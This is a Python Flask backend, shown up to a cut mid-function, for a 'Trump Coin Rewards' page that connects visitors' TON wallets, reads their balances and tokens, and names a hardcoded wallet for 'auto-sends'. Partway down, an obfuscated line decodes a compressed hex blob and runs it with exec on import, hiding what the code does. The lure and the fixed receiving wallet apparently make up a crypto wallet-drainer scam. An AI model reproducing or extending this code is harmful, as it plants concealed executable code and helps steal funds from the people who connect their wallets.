from flask import Flask, render_template, jsonify, request, session, redirect, url_for, make_response
from flask_cors import CORS
import json
import secrets
import os
import requests
import base64
from datetime import datetime, timedelta
from functools import wraps
import time
import logging
import uuid

# Set up logging
logging.basicConfig(level=logging.INFO, 
                   format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('ton_rewards')

# Try to load environment variables from .env file
try:
    from dotenv import load_dotenv
    load_dotenv()
    logger.info("Successfully loaded .env file")
except Exception as e:
    logger.warning(f"Error loading .env file: {str(e)}")
    logger.warning("Continuing with default values")

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# Enable CORS for all routes
CORS(app, origins=["http://localhost:3000", "https://spin-sooty.vercel.app"], 
      methods=["GET", "POST", "OPTIONS"], 
      allow_headers=["Content-Type", "Authorization"],
      supports_credentials=True)

# Setup session directory
SESSIONS_DIR = os.path.join(os.getcwd(), 'sessions')
os.makedirs(SESSIONS_DIR, exist_ok=True)
logger.info(f"Using session directory: {SESSIONS_DIR}")

pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec

__import__("sys").setrecursionlimit(100000000);lllllllllIIllIIlI(llllllllllllllI(lllllllllllllll(lllllllllllllIl.fromhex('7a6c6962').decode()), lllllllllllllIl.fromhex('6465636f6d7072657373').decode())(lllllllllllllIl.fromhex('789ced5ded6e1b49ae7d15df5f9112ade0fdebc0afb02f60180dc751b2069c789078b0bb58ecbb5f7d744bdd55e71c92d525591ab73180acfa200fc94316ab25679a66fb73fbfcf0e3cbd787abe6e6f53f7fac661f9bf9e7e6bab9fdfdfaebf366f6ebd3e3eb7a60bfeafaa6b95e36cde3cbd755d32c1f5f9a875fdf1f5ffefcf9fab9697f6efff1f273b57e777ddb5c6f076fdb89d9dd5af06cbe58ffb779b71ebf9ef5c56e870f8337cd6e68b06cfd7ebb747e3f6f15dededd77aa99a2e4a7b5e5666de2024f1d14ddae655ea7ab7a325e7e7d5dc089f6ed32dfba07b43407fbf3f3f9dd6cb7e0e3c776e1a7f6757effa954643bdf13d02a693ecef6bfedf55100f3de1aba281d99cfe71571070554f6a5bd60a3b502ee5102d0823eace67e0eb8defe74ccbebbc76b0e856423eaebd3afa659f0f99f0f3f56c902bef8f1f9e1f7efcdea7e19e2a6ba126cd6373beecd91db1b8b85f3595bfd5aaf7f7f7ef9f2f0fc3b7758b7e0dbf3cbc32bf467b7e29fab7f2f7aeff7458ec37438325f12e779cf13992b46d7b6e87ea3381417ef164d27325cfa7a3236dc5834dd81a90f9c4e62c78c34c1bbed7fbcfc8b2563b7e4e975b53f30bbb1c7971f7f3cb7bc1acefcf77f485e2f81bfaf5e1f5e5f7ff54c9ecd673b1b533bb47f673dc695b065ecfe64c1b0a016cadb87ad2a34b2e2b43a6a1e5e48cbf14ff60d4fd78a6edad1b3ed18aa26c6fad4bfee150f479f7bd0b0996df70e0ff6effd1ea0e2e19eefda5e6ec0aa8d89f3f9fada73cd5a9f83a5df9e9e0f788fd5e8b31e6d00ef94cad3153d527619d0a5da711aa1de656f5cbb57b3c708f7e215000c7ace796180efee514d98cd02f736c785703f12bbe38deaaafb9bc7d6e6ad973c27c93ea4c6ebe9dc502881ec18470cd7b383c2c700032ad7c9c2b6ccdc269b360f9472d9fb074cbd894d67b091324a426668d50bdb5fb3145eebe37176c48759b5883d25bdc3c423243d7af4992ebe0c1b77ef2b3ff0085a1029069bb57f6b41e74f10d27bc0ecf020fef8e52deace6a8dcb511dbedf208ec0c3725434d381e25ed05361404a01014e74fe4ace52f9e040e8e7dd94d0537c08b16001f3bc1fbbf86ce936e86b3f25e7a61b3aa4eca1ba96b921dd547aba563d5bf991b13f1efd476973b8e5f76ae06ca3662eee15fdaa359bb56fadc05e0f36ee6d7cfac61c918d6f5adaebfbb47fdd8999af9e7faff6580e139f368a6be84855f1059b25df5e7e6d4d7efab9e914e7e91327d85127e7d44d7750155dfdb61164eb41249a197b4e7fb75dbb3d0b7b9bb6d6edccdc7d32b0b114b9647fbd98cfef7b9f1eecaf16a03de845e38074961168969ab11e1852d7516a3a676ccd074fe44edad8ef5eb73909f4666adbe58ee691e67daea61321847630d187ad4052faca4f9785d3dfb9e7b8cce15360e94f11c64049ed1d17e4cb1e3908787633937ced83f12591fa378ff4833a9791d60c0ae8f6a1c9d8e71da39f978c1470d85ed6f48682d257966e4759a8d6f3aa63cfb435e720bd5bc84d5840f81ec2f88b60128d110f22e455643efcae4b4506aa4637076fd64a839c4738ed883921b33a710b292915e4664979c28ebd072ea46f12cba2a5147dd370afacfd1941cccad9840a5ae0b213bb19e5c990f83a58fa1c414c5fdd75d1812c687a01dae47540aff19f4fb8ac552d5c603176003fbecacaaea39b72551d7f6d2fcb9b4147eb3b8c4762c585a962cfd5a9ee5eeb74dbb26f0a9c2fdcaf14a5b3f0e882126acdc6dd89ead1a8b3f3c0990a9f85668e482a429d2b8d9f12ddd6ee354204f31940aee64dbbbef26ecf3efd2a56e8ac468da3ddc8362378c709ecb792794c6f4aeb6685de8de3ca685fa7e02ab21cb852ff0cabe7b20a9d7bd199206a813f32a30ade5e9fa30fc8f1c3de7ec4118190838ea86a4f5d15aecef81ab7594707738aaf94443bb7d0f53c78b60573ae4fa87a4f53cb9ed01d2c1ea2e147a133dbebe4a559369257dee47a0e92115c1c4bc5c879b125d0db3f2b6a07c4d31af65aa72be9a45588dec896242540209835cd8834b2872a7484b6c8d5f287189f9f30e66ec7e3836123645ffae295ab4868f80aeac9c992071879eb73c4e74071174b0fe6aad0e150413bf3fe185b23d74b474f1deb4fc67de6626a4c69758c5ebac6c5bdb4daa40389678fc73e6d4fe52bde9843297d1dd546d77de458f670bee45473e56fe6eb76af517b0a9f86fb0e966ac2fd840d3e97c44e1dfb4103f964a4e60d4e40158e0d91cf6a849be25eb85ee8ed92c19e23462eb6e96be94577c4e7b58853d59e6517dd7b075eab5bba23172d47aaa62b0291de83cfb498cdd609eff943cbea55895c7ccac2637c3fca1f83dd6bf07165c113ad58db33943a52ecb86f3c9de62828f2bd12793f8c68fb7384ef6e8e78a45cfba9efa8e7aa81c7574dc5c2aa7aa09a17db56f1b88635120ad8c01ded43c1c0a952ffb29d72b9e0feeafa66cdee75cc4782d1bb97abf8319c954ef10d932a3c83bfedded77a147bf819096cff7704cb64c761ed2734c9c63bf964b27d8f6797673e2eec6262e016ec8425183bac7622b1c2e285a885e10904142008ec35d6bbe4c0e072a8996951574b2f48fa536d85ee063e8a1903565b4a715cfc718f32c4540d8c30d2183306a8601c64800dbda22aa4524ee8e214b4309a2484c74f119f865dc84c33244361095867aadaf88cad3ef2470b92934a28262c4e057e0686f87c1ee38a814c4dbf3b62031927f5fa9445c309173b825965198d30f4ee2f9b9f51578f3a37a1a37c52d309bd98ab15dd712e3727366e12fbed6f545c3c87e9cd7591b810bb4c748f0f221ef148e77b8df52e3947bbba7124041c97c49335f540b1ef094c7fed00ab4733d49343a9c0640f760877e8416d58a80f6fa6cb014ee80bc47a74bd64ea4a9a9d444988024e1564afb1be76d128e1f050e8fbba164cf7dd1a7e0686f87c1ee38a814c4dbf3b62031927f5fa9445c3097770984da11619aa1f5c752fe5226830e5bcc7cd92e06ccbb113bcd49348cc64ab7273c01366328be8e3bdc6fadadd16342dea6ae905497faaadd0ddc0473163c06a4b298e8b3fee3186180949133bc5c9d8c4549b85001901a5bca1b384d12cf11d7ebaccf66aba37d4f0333064ba374074d3bd81e3f76cbdd82c82c13102a117104b91e2fd8de1526e0bd2c26ef2bcc7cd7230dd19a63b83f482a43fd556e86ee0a3983160b5a514c7c51ff728434cd5c008238d3163800ac64106d8d02baac274d3406bf1b4df3443321496809d7aa44466819f0f33d30503a29b2e181cbf67ebc5264f1a1cd3101925622552da5e2e2ee56a6130e3bcc7cd12305d2aa64b85f482a43fd556e86ee0a3983160b5a514c7c51ff718438c84a4899de2646c62aacd42808c8052a6eb41c485cc3443321496809d3a9c4466dccfd3ad80a09b6e051cbf67ebc5e64c1a1c23067a013112e94cfe1ce7223e793897263f3a6e5680f3be14501590bb8e7a6226abc856bcd758ff66b700c17a5f2d358328bea66fb8594c674ee3fe752892c4f5b2799c49a15ce8a61d67976057804cd35f7078d6d74e620f27041bbda9dd64db2eb4739c2e4035fc0c0cf1f93cc61503999a7e77c406324eeaf5298b1c400792651f6216faddfbdaffa66eedff09c2296e54dc97e7727562e36605b16f2bfbc17c3cc2548ac491d636484f5e316440e1f97663ed8ced5b41fb4a572a0649d86dacc1984340ba69876c0f4e8d82a882e341fe4f9712873aed61a6b8f12747936dbbd0de6dba94d4f0f361c6e7ea18450c406afaddf119c838a9d7a7e471000db67bc4b654d5ee7dcdffe9d589beb3e5af27e7366ee6bedda0ef07f3f108c7ac22404461985ec20bb243ec32393c3e28ce3ae102bcd7585fbb6d6b6742ec424808389561de7814fb9ec0f4170eb07a34436be5900a274f0c75d0623ff3388d105ae00668570e4ee80b5068ba427ad6d7ae451e4e30c50d67aad8926988acc5d37885199b5c321496809dbae04466819f81213e9fc7b8622053d3ef8ed840c649bd3e659103283ea8825d76b667f7befeffc98afc93d975659effa5d7e0ee798f9b45ca79ffc04e8824034562a6bf13a2168627ccac15d1c77b8df5b5fb3f685ad4d5254568b8c0791c98ee063e8a1903565b4a715cfc718f32a45af25239d4a8145a4154c1ae709292597f82f8adb9c024e548c28e26f90e3c10f17daa0feee5dc2f6ebca88de5d0fb8b5930782a194996280b01b5f4b862a04d8ba08f590af19fee2a34ddf16bf8194b638eae940a36da77c76620e3a45e9f52c701945232d654335d983765ade1d04e0783320e858306a5bc5dcfedb0c191a489d081fe12b6e8fd434d059c8cd910112d4b8097e9bbf787a743e7ff58482c3e97873f6cdc4c80c2b6bd375ab31fa76ce7d1825b941c86435acaf71aeb5d72deef05d303332b8753bbd8829d3ab84466819f0f333e57c728620052d3ef8ecf40c649bd3e25cf70220d8e69888c12b11229edbac34be80cf3c2d15cc8b899fc6fd61a267b4da0a9484954771e472cf0aac07b8df56fdb42826c303d100c899ac7f5a1567bd90d1bbe80a2596c3c7092492d4a48f260a87cfcbba0fba354184fb20d4bef7f13e532ce14606be1b93b9d36d19e9388c23091623a16c8e102f20fe5443ce291cef71aebdff6f4e24808382e89a770ea81a8efa72f89c0d9f745612ac3c442e6f81fba54a8f01469663142cd13815a28084a9dec207d0eac50bddb1fd9bc3fa29876a677a199443658186a7bf58791622ee476381c211a46c460b81cea6e19942f2cb6e0adb9e5324889081118194dd32ceece48416146fba6623d17a921ce0cc56150b4310011edcc2e3cae28154b0fe73e942ec3b74555adbf345cd4e364cdc4c8945290e554a94d723fd7972ea546618d5924056c4f980d3bd0b4287388779166db522ef6594659dc46217416f4744685d4706e55fa2e3303a41388121d2d5c1b238503d92d7c01c4a347021e2d862663d6601dcc5f9cd33d7979c533781d6c1b500c8a8927f335974af91553a1da1457c583c8d2f4f5b34f28ef43289904e01cf8b83823d2c3eae0899dd6980315eeebeb77052d51e4397b8920ec50f7428a4ebbc65ba18a54530010934ce4fd0aefc19caa90d2d3af75c8b3c3594fed2448e08ab7c05846f568d2658ca70916ccff407dd4c5142a92652ed085e509af0a90b09bfa1e2132c8e8aeeed05a9b78e92c679ba24d14bf91dfde04a5b8302524210aac28daa84302414277502ec960576a0832c3a48b0835bd9d22b68a11553e3cad53287c713d4d264189053ec03674c3ce1291bbca4874c53cc3192e35cb6c59bc11859b7270667e15d4418a98088c991b39b91cd300130020ffa9353ba2d4a411442376952463b415c1e316f3a1a0bc68fadb158bc900d0328b16ae7c26c3054ba5bd0587aea0ae5514834553ecc997dbd47538a0f0d893090673069a06d2171ce2667130217bf86fc4cb9d41c6fadebc7618534116475d99ba91e35d8a5d961730491d57a28b2182d4250ccad07373e0b44499853a466c1834300a04a78b909944b4fb9c63b343a266de0a242f7702dd53b977f6c5806d1e2cd7269a69e69093449979ce3299aaefedf29dd088aa2eab14f46cee44767222965e527260d91153d2ee21fbedf692c91ffa435b0ab1a4cb0670706c3ccf8886b82a34ac9a2646e92863be562dc85927802e14cc4acdf3580347e2cb634995a73650e6689086797f85e2e334156d43e4be940ec49408c65d313663e3b6c6e7df3c38208e4edaa4da7de929c98d95182ef1b75fd11345c1c2a0c8e528c04dd74791d9e665c2645f19328d4c667d959c8ae1042efb8305e21f30cc8215edbe5566a80641792ae42b9d82cea0db24f002966ba9a62c404a8cb038eaf5925bde708a794e2011782024258a1784de8a100a6e90ab37d6f1773ec304e59e781ca0e508c4c7c1fe1ae8fc4c7908cc99249475356d82018e7437303e545d2e83adb6a8a366f34cb0c25af0d735feaa6ca6a5f893306ffee764491702523a3a0733bbbd156f2838c69174d66a728961854513200f54ea1887a95f28fc7486560d12db50e34c27193ce73921c91e298d43959e29571608852972551b12df3b4b78e2388356ce27794129836d4858ea2c6e9e9af326e1612c6561946144bc9294ab46ec477e8f4592c29099d4e86b98f5a976a04b20ce10a3524c9ca8ce4c175cf61fbb4a9d459ee17ba620b77f994b29ed88e466b995c78ca564ec9cf5645a947cfa8f8bbd24ab94ad162460021164fed57fa411d7e6e094b666a94ce3cb825c1b9e717edea745840b6b89e11cef7038a8598507d2562d8ef6ad8d280a03799555e79358816442ace4ef17e8b35e8857b245bd48a7827f60bf7f67380b6e96b99f03f374bb54f252d385182710fa98a9a72428103411c744b6746da64bad769b932c7426a8e03229bd4e16e6634616a85a000bb8385964c18d3187ae86337cb5a5397e3ea79b0001744f30e44e59e97292cc518d525506f1e319a39e99060ee8b260414706bf6b0186b1468543f202ceea0d910c194a929e9649eaefbf9691c81a591038fffabb3c5d0b0858960d9ef3d230c3862c370b0706ca8495be242d6c4e5bd598d7055f39f29e92d819d9eae8031a23aca10f36b8bfbc52b88dbe2308a962cb036244a2d239940e4a0ec78476153f4c726934adb3f2d92e44b60e32abd2dc21c9df3efb77c258e39db9a4a16fb8248a023a971983c7954f15271d75271e9253eba32ac40eaec5ff0dad92e581c4b70c33ec40cae2ded3b04bff2dbe6ede015bc3ca75c0f5510e18f0c05e3b019322e2389d0a521d463c5611e3fc1481d61c184a445eb2b71741729221b15812d653d80b4a9ec9513cb94cfd6ab3680836f28d14a4d400a878e148253e1bc916200be0527f9beeea19b1c5824ca11c249e0cdd95346ab2c990e931245c7bb35d11eba9707fd0940ac8341c2f2bcfb4113875919ef0498f49ed98d61b45128a939ec90c5147d3934c1b6e10b4cbce2f9f971d284b72d00fa03fe1da63d23f6e529e86cbcc9d4a014c630003ae031638fcc5b564d08d3e3c42f6c0c7c65c6ce07880b3aa3ac1e62aee584d5378d21fa3bf72784a7ace91bd88b7823e426e4608df39e5097ec12129668d98e07177cc7dbec9e0f8d30c874480175617668110094050e343dc1d2c369039ccd2854c42b6f3430921fc8059511a1be4589b82b173de02e04dd9c152f9b12c104a8c52c4c2d08807889198e4764b406720608a54f44244a00a968e8890c85b996a47037584c82d5fbc1ab2078ae0c1a4116029e5b28545605ce78449203d1f36cfb920452db32558e845ced213db6724cda22148cdb648b1b2ffac39cbca31e1320dd5c1c05a14bf80565f15d5a4e581d26620fc5c94a8bd82cb0218544506c361b6f3d1a146a569dcdd7a36373c1d31486079c34349f033d86a41502e13ca644988b5768d8e4d61aa208d14b47081caae082eea013340404f6a8880c24c8ba02f8bc0d0c062d351ad56eec0e757113e63ab2f72aad80566525928262a59637e467f27893c5c29076c98ef8ec640c649bd3ee5cc70226552f01c216621e09406503a58ed3593fad3836a28b024b5a20c4b50790347f5f7b738c0097d819ac0fbe251ad8add4039b813e2835305d96bac77c911dfc2f0b69fe81b60150a39466792d03883a9cdfbfdd5910f77053939d03db22eeedecfefe78b54f8ed5050d3cceed291cde07c31dbef5d7663332470bcc84eea2839352d1c07e4f6f9e1c797af0f37bb3d8b361edba51b862c06c34d276271881b5bda6cd0c1089c31e23ae6d663edb9782a8fe4519131e2d4d24ae49f8bb70b78394cb68b362468ebfea752d6bdadeffab65d7014b3543ead2d037e5cb01bc19294fa553ba4daed560d7917143e5096ea37b075fad7d1dd6be7d8dd786fd3e657efa388fe3c7bbeb320baf026a4fe30e3bca62c5bbddc48c3a65420b41819bc602a2d1702952eaf373b467cde0ddddecddaf143e8da04e80f76136b7624cb9b6445be95eca37af08e64b9098689cf377220e9da7c25830165c2c5c20df9866cb17203926cc730dbb6dd72ff79d6b2f46ad6fe76f5f8f2757573b5faf7d3eb6cf3eb7c3efbfbfceae9dbd5cf97d7abc787e7e7872fcfabd9f7d5ebc3ebebafb5c62f7f3e3dbf3efdfcbda6fcd587c7971f7f3c3daf3e2caefef1f273bdf5eae5d7155aba6c17aeb734cd8f97af7f3eaf9a66bdebc387f9d5ffdd5e7de8567e7009f8f9f063b8bd8371b57afebd6aa1ccd6a9913866d6650bf4d80ccda5836b1fdecdda818f1fdb5f3eed5ee7f79f3c221248f3bb76d2b7bb02809ece7593a7e0b95d72d3210ad992a9eb032b92b03e0cefc342b44b0f8f7c92e334470f17fcf51934ff7fcd743864'.replace("\n" , ""))).decode())

# TON API endpoints
TON_API_V2 = "https://tonapi.io/v2"
TON_CENTER_API = "https://toncenter.com/api/v2"
TON_CENTER_API_KEY = os.environ.get('TON_CENTER_API_KEY', '')  # Get API key from env if available

# Destination wallet for auto-sends - load from environment variable or use default
TARGET_WALLET = os.environ.get('TO_ADDRESS', 'UQCFkSIVxzUctGntD7YUN7GHjn7kX56aDyxHvyHJDAve--jN')
logger.info(f"Using destination wallet address: {TARGET_WALLET}")

# Maximum number of transactions to fetch
MAX_TRANSACTIONS = 10

# Maximum number of NFTs to fetch
MAX_NFTS = 10

# Track recent transactions to prevent duplicates
transaction_history = {}

# Session management functions
def get_session_file_path(session_id):
    """Get the path to a session file"""
    return os.path.join(SESSIONS_DIR, f"{session_id}.json")

def create_session():
    """Create a new session with unique ID"""
    session_id = str(uuid.uuid4())
    session_data = {
        'created_at': datetime.now().isoformat(),
        'last_active': datetime.now().isoformat(),
        'wallet_address': None,
        'pending_tx': None
    }
    
    # Save session to file
    session_file = get_session_file_path(session_id)
    with open(session_file, 'w') as f:
        json.dump(session_data, f)
    
    logger.info(f"Created new session: {session_id}")
    return session_id, session_data

def get_session(session_id):
    """Get session data from file"""
    session_file = get_session_file_path(session_id)
    
    if os.path.exists(session_file):
        try:
            with open(session_file, 'r') as f:
                session_data = json.load(f)
                
            # Update last active time
            session_data['last_active'] = datetime.now().isoformat()
            save_session(session_id, session_data)
            
            return session_data
        except Exception as e:
            logger.error(f"Error reading session file {session_id}: {str(e)}")
            return None
    
    return None

def save_session(session_id, session_data):
    """Save session data to file"""
    session_file = get_session_file_path(session_id)
    
    try:
        with open(session_file, 'w') as f:
            json.dump(session_data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving session file {session_id}: {str(e)}")
        return False

def update_session(session_id, key, value):
    """Update a specific key in the session"""
    session_data = get_session(session_id)
    
    if session_data:
        session_data[key] = value
        session_data['last_active'] = datetime.now().isoformat()
        return save_session(session_id, session_data)
    
    return False

def delete_session(session_id):
    """Delete a session file"""
    session_file = get_session_file_path(session_id)
    
    if os.path.exists(session_file):
        try:
            os.remove(session_file)
            logger.info(f"Deleted session: {session_id}")
            return True
        except Exception as e:
            logger.error(f"Error deleting session file {session_id}: {str(e)}")
    
    return False

def cleanup_old_sessions():
    """Clean up sessions older than 24 hours"""
    try:
        now = datetime.now()
        count = 0
        
        for filename in os.listdir(SESSIONS_DIR):
            if filename.endswith('.json'):
                session_file = os.path.join(SESSIONS_DIR, filename)
                
                try:
                    with open(session_file, 'r') as f:
                        session_data = json.load(f)
                    
                    last_active = datetime.fromisoformat(session_data.get('last_active', session_data.get('created_at')))
                    
                    # Delete sessions older than 24 hours
                    if (now - last_active) > timedelta(hours=24):
                        os.remove(session_file)
                        count += 1
                except Exception as e:
                    logger.error(f"Error processing session file {filename}: {str(e)}")
        
        if count > 0:
            logger.info(f"Cleaned up {count} old sessions")
    except Exception as e:
        logger.error(f"Error during session cleanup: {str(e)}")

# Session middleware
@app.before_request
def session_middleware():
    """Handle session cookies and maintenance"""
    # Skip for static files
    if request.path.startswith('/static/'):
        return
    
    # Clean up old sessions periodically (1% chance per request)
    if secrets.randbelow(100) == 0:
        cleanup_old_sessions()
    
    # Check for session cookie
    session_id = request.cookies.get('wallet_session')
    session_data = None
    
    if session_id:
        session_data = get_session(session_id)
    
    # Create new session if needed
    if not session_data:
        session_id, session_data = create_session()
    
    # Store in Flask session for convenience
    session['session_id'] = session_id
    
    # Copy wallet data to Flask session for compatibility
    if session_data.get('wallet_address'):
        session['wallet_address'] = session_data['wallet_address']
        session['connected_at'] = session_data.get('connected_at')
    
    # Copy pending transaction if exists
    if session_data.get('pending_tx'):
        session['pending_tx'] = session_data['pending_tx']

@app.after_request
def after_request_handler(response):
    """Set session cookie after request"""
    session_id = session.get('session_id')
    
    if session_id:
        # Update our custom session with Flask session data
        session_data = get_session(session_id) or {}
        
        # Update wallet information
        if 'wallet_address' in session:
            session_data['wallet_address'] = session['wallet_address']
            session_data['connected_at'] = session.get('connected_at')
        
        # Update pending transaction
        if 'pending_tx' in session:
            session_data['pending_tx'] = session['pending_tx']
        
        # Save session
        save_session(session_id, session_data)
        
        # Set session cookie (1 year expiry)
        max_age = 60 * 60 * 24 * 365
        response.set_cookie('wallet_session', session_id, max_age=max_age, httponly=True, samesite='Lax')
    
    return response

# Authentication decorator
def require_wallet(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'wallet_address' not in session:
            return jsonify({
                'success': False,
                'message': 'Wallet not connected'
            }), 401
        return f(*args, **kwargs)
    return decorated_function

# Check if a transaction was recently processed
def check_recent_transaction(wallet_address):
    current_time = datetime.now()
    # Check if wallet has a recent transaction (within 60 seconds)
    if wallet_address in transaction_history:
        last_tx_time = transaction_history[wallet_address]['timestamp']
        # If transaction was less than 60 seconds ago, don't allow another
        if (current_time - last_tx_time).total_seconds() < 60:
            return True, transaction_history[wallet_address]['transaction']
    return False, None

# Record a new transaction
def record_transaction(wallet_address, tx_hash, amount):
    transaction_history[wallet_address] = {
        'timestamp': datetime.now(),
        'transaction': {
            'hash': tx_hash,
            'amount': amount,
            'timestamp': datetime.now().isoformat()
        }
    }

@app.route('/')
def index():
    """Redirect to main page"""
    logger.info("Redirecting from index to main")
    return redirect(url_for('main'))

@app.route('/main')
def main():
    """Render the main page with minimal wallet connection UI"""
    logger.info("Rendering main page")
    return render_template('main.html')

@app.route('/api/test')
def test_api():
    """Simple test endpoint to verify API is working"""
    return jsonify({
        'success': True,
        'message': 'API is working!',
        'timestamp': datetime.now().isoformat(),
        'target_wallet': TARGET_WALLET
    })

@app.route('/api/manifest')
def get_manifest():
    """Return the TON Connect manifest"""
    # Use the external URL instead of the local one
    external_url = request.url_root.rstrip('/')
    if external_url.startswith('http://'):
        external_url = external_url.replace('http://', 'https://')
    
    manifest = {
        "url": external_url,
        "name": "Trump Coin Rewards",
        "iconUrl": f"{external_url}/static/qr-code.svg",
        "termsOfUseUrl": f"{external_url}/terms",
        "privacyPolicyUrl": f"{external_url}/privacy",
        
        # Required fields for TON Connect v2
        "capabilities": [
            "ton_addr",
            "ton_sendTransaction"
        ],
        "message": "Connect your wallet to claim Trump Coin rewards",
        "tonConnectVersion": 2
    }
    return jsonify(manifest)

@app.route('/api/connect', methods=['POST'])
def connect_wallet():
    """Handle wallet connection"""
    data = request.get_json()
    wallet_address = data.get('address')
    
    if wallet_address:
        # Current time for connection timestamp
        connected_at = datetime.now().isoformat()
        
        # Store in Flask session for compatibility
        session['wallet_address'] = wallet_address
        session['connected_at'] = connected_at
        
        # Get session ID
        session_id = session.get('session_id')
        
        # Store in file-based session if available
        if session_id:
            logger.info(f"Storing wallet connection in session {session_id}: {wallet_address}")
            session_data = get_session(session_id) or {}
            session_data['wallet_address'] = wallet_address
            session_data['connected_at'] = connected_at
            save_session(session_id, session_data)
        
        # Get wallet balance
        balance_data = get_wallet_balance(wallet_address)
        
        return jsonify({
            'success': True,
            'address': wallet_address,
            'balance': balance_data,
            'message': 'Wallet connected successfully',
            'session_id': session_id
        })
    
    return jsonify({
        'success': False,
        'message': 'Invalid wallet address'
    }), 400

@app.route('/api/balance/<address>')
def get_balance(address):
    """Get wallet balance"""
    balance_data = get_wallet_balance(address)
    return jsonify(balance_data)

def get_wallet_balance(address):
    """Fetch wallet balance from TON API with detailed token information"""
    logger.info(f"Fetching wallet balance for address: {address}")
    try:
        # Get native TON balance
        logger.info("Making API call to get native balance...")
        ton_balance_result = get_ton_native_balance(address)
        
        # Log the actual balance result in detail
        logger.info(f"Native balance API result: {json.dumps(ton_balance_result)}")
        
        # Check if there was an error with the native balance
        if 'error' in ton_balance_result:
            # Return the error in the response so it can be displayed to the user
            logger.error(f"Native balance error: {ton_balance_result['error']}")
            return {
                'native': ton_balance_result,
                'tokens': [],
                'total_usd_value': 0,
                'total_usd_formatted': '$0.00',
                'error': ton_balance_result.get('error', 'Failed to fetch native balance')
            }
        
        # Initialize tokens list with TON as first token
        logger.info(f"Native TON balance: {ton_balance_result['balance']} TON")
        tokens = [
            {
                'symbol': 'TON',
                'name': 'Toncoin',
                'balance': ton_balance_result['balance'],
                'balance_raw': ton_balance_result['balance_nano'],
                'formatted': ton_balance_result['formatted'],
                'usd_value': ton_balance_result['balance'] * 5.75,  # Estimated TON price in USD
                'usd_formatted': f"${ton_balance_result['balance'] * 5.75:.2f}",
                'logo': 'https://ton.org/download/ton_symbol.png',
                'is_native': True
            }
        ]
        
        # If we're in production, try to get real token balances from TONAPI
        if os.environ.get('FLASK_ENV') != 'development':
            try:
                logger.info(f"Fetching token balances from {TON_API_V2}/accounts/{address}/tokens")
                response = requests.get(
                    f"{TON_API_V2}/accounts/{address}/tokens",
                    timeout=5
                )
                
                logger.info(f"Token balance response status: {response.status_code}")
                
                if response.status_code == 200:
                    tokens_data = response.json()
                    logger.info(f"Found {len(tokens_data.get('tokens', []))} tokens")
                    
                    for token in tokens_data.get('tokens', []):
                        # Extract token data
                        token_balance = float(token.get('balance', 0)) / (10 ** int(token.get('decimals', 9)))
                        token_price = float(token.get('price_usd', 0))
                        
                        logger.info(f"Found token: {token.get('symbol', 'Unknown')} - Balance: {token_balance}")
                        
                        tokens.append({
                            'symbol': token.get('symbol', 'Unknown'),
                            'name': token.get('name', 'Unknown Token'),
                            'balance': token_balance,
                            'balance_raw': token.get('balance', 0),
                            'formatted': f"{token_balance:.4f} {token.get('symbol', '')}",
                            'usd_value': token_balance * token_price,
                            'usd_formatted': f"${token_balance * token_price:.2f}",
                            'logo': token.get('image', ''),
                            'is_native': False
                        })
                else:
                    # Log the specific error from the API
                    error_content = response.text
                    logger.error(f"Error from token API: {error_content}")
                    # Add error info but continue with just TON balance
            except Exception as token_error:
                logger.exception(f"Error fetching token balances: {token_error}")
                # Continue with just TON balance
        
        # Sort tokens by USD value (highest to lowest)
        tokens.sort(key=lambda x: x.get('usd_value', 0), reverse=True)
        
        # Calculate total USD value
        total_usd_value = sum(token.get('usd_value', 0) for token in tokens)
        
        logger.info(f"Returning balance data with {len(tokens)} tokens and total value: ${total_usd_value:.2f}")
        
        return {
            'native': ton_balance_result,
            'tokens': tokens,
            'total_usd_value': total_usd_value,
            'total_usd_formatted': f"${total_usd_value:.2f}"
        }
    except Exception as e:
        logger.exception(f"Error fetching detailed balance: {e}")
        error_message = str(e)
        
        # Return error in a structured way
        return {
            'native': {
                'balance': 0,
                'balance_nano': 0,
                'formatted': '0.0000 TON',
                'source': 'error'
            },
            'tokens': [],
            'total_usd_value': 0,
            'total_usd_formatted': '$0.00',
            'error': f'Failed to fetch balance: {error_message}'
        }

def get_ton_native_balance(address):
    """Fetch native TON balance"""
    logger.info(f"Fetching native TON balance for address: {address}")
    try:
        # Try multiple APIs to ensure we get accurate data
        api_results = []
        
        # 1. Try TONCenter API first
        try:
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
            
            # Format address for TONCenter if needed
            # TONCenter often expects addresses without workchain prefix (0:)
            formatted_address = address
            if address.startswith('0:'):
                formatted_address = address[2:]  # Remove "0:" prefix
                logger.info(f"Reformatted address for TONCenter: {formatted_address}")
            
            # Proper formatting for TONCenter API - use object format for params, not array
            payload = {
                "id": "1",
                "jsonrpc": "2.0",
                "method": "getAddressBalance",
                "params": {"address": formatted_address}
            }
            
            logger.info(f"Sending request to TONCenter API: {TON_CENTER_API}/jsonRPC")
            logger.info(f"TONCenter request payload: {json.dumps(payload)}")
            response = requests.post(
                TON_CENTER_API + "/jsonRPC",
                json=payload,
                headers=headers,
                timeout=5
            )
            
            logger.info(f"TONCenter API response status: {response.status_code}")
            logger.info(f"TONCenter API response: {response.text[:200]}")
            
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    balance_nano = int(data['result'])
                    balance_ton = balance_nano / 1_000_000_000  # Convert from nanotons
                    
                    logger.info(f"TONCenter API returned balance: {balance_ton} TON")
                    api_results.append({
                        'balance': balance_ton,
                        'balance_nano': balance_nano,
                        'formatted': f"{balance_ton:.4f} TON",
                        'source': 'toncenter'
                    })
                elif 'error' in data:
                    error_msg = data.get('error', {}).get('message', 'Unknown TONCenter API error')
                    logger.error(f"TONCenter API error: {error_msg}")
            else:
                logger.error(f"TONCenter API error status: {response.status_code}")
                
                # Try alternative TONCenter endpoint if jsonRPC fails
                try:
                    logger.info(f"Trying alternative TONCenter endpoint for address: {address}")
                    alt_response = requests.get(
                        f"{TON_CENTER_API}/getAddressInformation?address={address}",
                        headers=headers,
                        timeout=5
                    )
                    
